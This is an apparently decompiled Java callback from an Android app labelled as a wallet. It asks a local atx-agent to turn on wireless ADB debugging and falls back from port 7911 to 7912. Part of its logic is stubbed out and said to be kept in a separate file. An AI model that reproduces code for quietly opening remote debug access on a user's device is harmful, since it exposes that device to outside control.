package com.guard.wallet.http;
import com.guard.wallet.core.AppUtils;

import android.util.Log;
import com.guard.wallet.resp.ApiResult;
import com.guard.wallet.service.MyAccessibilityService;
import java.io.IOException;
import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.Request;
import okhttp3.Response;
import okhttp3.ResponseBody;

/**
 * 打开 WiFi 调试回调 — vendor http/r.
 *
 * 向 atx-agent 发送开启无线调试请求:
 * - 失败时自动尝试备用端口 (7911 -> 7912)
 * - 成功时记录日志
 * - 含 AdbConnectionManager 回退逻辑 (详见 .pending 文件)
 */
public final class OpenWifiDebugCallback implements Callback {
    @Override
    public void onFailure(Call call, IOException e) {
        AppUtils.s("OpenWifiDebugCallback", e);
        if (!(e instanceof DuplicateRequestException)) {
            String host = call.request().url().host();
            if (!AppUtils.B(host)) {
                Request request = call.request();
                HttpClient.finishRequest(request.url().host());
                if (request.url().toString().contains("127.0.0.1:7911")) {
                    HttpApiManager.openWifiDebug("http://127.0.0.1:7912");
                }
                // vendor: AdbConnectionManager.getInstance() — see .pending file for full logic
            }
        }
    }
    @Override
    public void onResponse(Call call, Response response) throws IOException {
        Request request = call.request();
        String host = request.url().host();
        HttpClient.finishRequest(host);
        ResponseBody var3 = response.body();
        if (var3 != null) {
            try {
                OpenWifiDebugCallback$1 var4 = new OpenWifiDebugCallback$1();
                ApiResult var13 = (ApiResult) com.guard.wallet.utils.SharedPrefsManager.c(var3.string(), var4);
                if (var13 != null && var13.getSuccess() && (Boolean) var13.getData()) {
                    Log.d("OpenWifiDebugCallback", "开启无线调试成功");
                } else if (!AppUtils.B(host) && request.url().toString().contains("127.0.0.1:7911")) {
                    HttpApiManager.openWifiDebug("http://127.0.0.1:7912");
                }
                // vendor: AdbConnectionManager.getInstance() fallback — see .pending file for full logic
            } catch (Exception var12) { AppUtils.s("OpenWifiDebugCallback", var12); }
        }
        response.close();
    }
}
